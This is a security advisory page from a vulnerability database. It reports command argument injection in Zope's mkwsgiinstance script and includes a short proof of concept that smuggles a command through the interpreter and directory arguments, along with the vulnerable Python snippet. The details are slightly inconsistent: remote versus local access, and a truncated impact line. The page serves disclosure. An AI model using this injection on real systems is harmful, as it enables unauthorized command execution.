---
title: Zope 5.9 Command Injection
url: https://cxsecurity.com/issue/WLB-2024050046
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2024-05-17
fetch_date: 2025-10-06T17:13:42.250144
---

# Zope 5.9 Command Injection

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Zope 5.9 Command Injection** **2024.05.16**  Credit:  **[Ilyase Dehy](https://cxsecurity.com/author/Ilyase%2BDehy/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **[CWE-78](https://cxsecurity.com/cwe/CWE-78 "Click to see CWE-78")** | |

# Vulnerability Report
## Title: Command Argument Injection Vulnerability in Zope WSGI Instance Creation Script Leading to RCE
### Description:
A command Argument injection vulnerability has been identified in the Zope WSGI instance creation script used by the Zope web application server framework, which is maintained by the Zope Foundation. The script, mkwsgiinstance, facilitates the setup of new Zope WSGI application instances and involves specifying the Python interpreter among other parameters via command-line arguments. The flaw stems from insufficient validation of the Python interpreter path, allowing an attacker to execute arbitrary shell commands.
### Affected Product:
Product: Zope WSGI instance creation script (mkwsgiinstance)
Version: All versions prior to the most recent update
-Impact:
This vulnerability permits an attacker with local access to the server to execute arbitrary commands with the privileges of the user running the mkwsgiinstance script. The potential impacts include unauthorized information disclosure
### POC:
```bash
(env) root@lab:/opt/Zope# mkwsgiinstance -p "/usr/bin/mkdir" -d "/tmp/temp;"
Please choose a username and password for the initial user.
These will be the credentials you use to initially manage
your new Zope instance.
Username: d
Password:
Verify password:
(env) root@lab:/opt/Zope# ls /tmp
'temp;'
```
In this example, the attacker replaces the Python interpreter argument (-p) with the mkdir command, followed by an arbitrary directory path. Due to inadequate command-line argument sanitation, the script executes the mkdir command, thus illustrating arbitrary command execution.
### Vulnerable Code Snippet:
```python
if opt in ("-p", "--python"):
python = os.path.abspath(os.path.expanduser(arg))
if not os.path.exists(python) and os.path.isfile(python):
usage(sys.stderr, "The Python interpreter does not exist.")
sys.exit(2)
```
This code snippet fails to adequately validate the python variable that influences subprocess commands directly, enabling potential command injection when malicious inputs are utilized.
CVSS Calculated Vulnerability Score:
https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:L/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
### Credits:
This vulnerability was disclosed by Aymane MAZGUITI / Ilyase Dehy.

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2024050046)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top